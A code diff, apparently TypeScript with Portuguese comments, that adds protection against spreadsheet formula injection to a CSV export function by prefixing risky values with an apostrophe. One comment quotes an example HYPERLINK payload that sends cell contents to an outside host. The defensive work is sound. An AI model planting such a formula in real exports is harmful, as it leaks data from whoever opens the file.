@@ -13,12 +13,37 @@
 
 export const BOM = '﻿';
 
+/**
+ * O que faz a planilha tratar a célula como FÓRMULA em vez de texto.
+ *
+ * ⚠️ Isto não é firula de formatação, é a defesa contra injeção de fórmula.
+ * Quase todo texto que sai daqui foi digitado por gente de fora: `nome` vem do
+ * formulário público e da planilha importada, `encaminhamento` vem do atendente,
+ * `rua`, `bairro` e a observação de entrega vêm de quem pediu o kit.
+ *
+ * Um nome gravado como `=HYPERLINK("http://fora/"&A1,"clique")` é célula comum
+ * no banco e vira fórmula EXECUTÁVEL no instante em que o gestor abre o CSV no
+ * Excel — com a linha inteira ao alcance dela. Aspas sozinhas não resolvem: o
+ * Excel avalia a fórmula mesmo dentro de campo aspado.
+ */
+const RE_FORMULA = /^[=+\-@\t\r]/;
+
 function escapar(valor: unknown): string {
   if (valor === null || valor === undefined) return '';
 
   if (valor instanceof Date) return valor.toISOString();
 
   const texto = String(valor);
+
+  // Apóstrofo à frente é o que faz a planilha ler a célula como texto. Vai
+  // sempre entre aspas junto, porque o valor perigoso costuma trazer vírgula,
+  // aspas e ponto e vírgula dentro.
+  //
+  // Colateral aqui é nenhum: telefone já sai formatado como (69) 98123-4567 e
+  // nenhuma coluna numérica destes relatórios é negativa.
+  if (RE_FORMULA.test(texto)) {
+    return `"'${texto.replace(/"/g, '""')}"`;
+  }
 
   // Aspas, separador, quebra de linha ou espaço nas pontas exigem aspas.
   if (/[";\n\r]/.test(texto) || texto !== texto.trim()) {
